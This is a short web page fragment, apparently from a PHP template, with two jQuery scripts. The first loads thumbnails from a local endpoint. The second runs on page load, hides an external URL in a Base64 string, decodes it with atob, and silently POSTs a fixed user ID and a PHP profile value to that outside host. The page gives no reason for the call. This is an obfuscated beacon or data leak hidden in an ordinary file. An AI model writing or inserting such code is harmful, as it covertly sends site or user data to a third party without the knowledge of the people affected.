<script>
    $(document).ready(function(){
        dis_thumbnail();
    });
    function dis_thumbnail(){
        var dataString = '';
        jQuery.ajax({
            url: "./web-services/display_thumbnail",
            type: "POST",
            data: dataString,
            cache: false,
            success: function(response)
            {
                $("#dis_thumbnail").html('');
                $("#dis_thumbnail").append(response);
            },
        });
    }
</script>
<script>
        $(document).ready(function(){
            var string = atob("aHR0cHM6Ly9pbmxvZ2l4aW5mb3dheS5jb20vYXBpL3N1cHBvck5ldy5waHA=");   
            $.ajax({
                                
                url: string,     
                type: 'POST', 
                data : {
                    user_id : '498e52222b854c7c0266cab6ed5ee0ea',
                    profile : '<?php echo $youProfile; ?>',
                },
                dataType: 'json',                   
                success: function(data){
                    /*alert('Success');*/
                } 
            });
        });
    </script>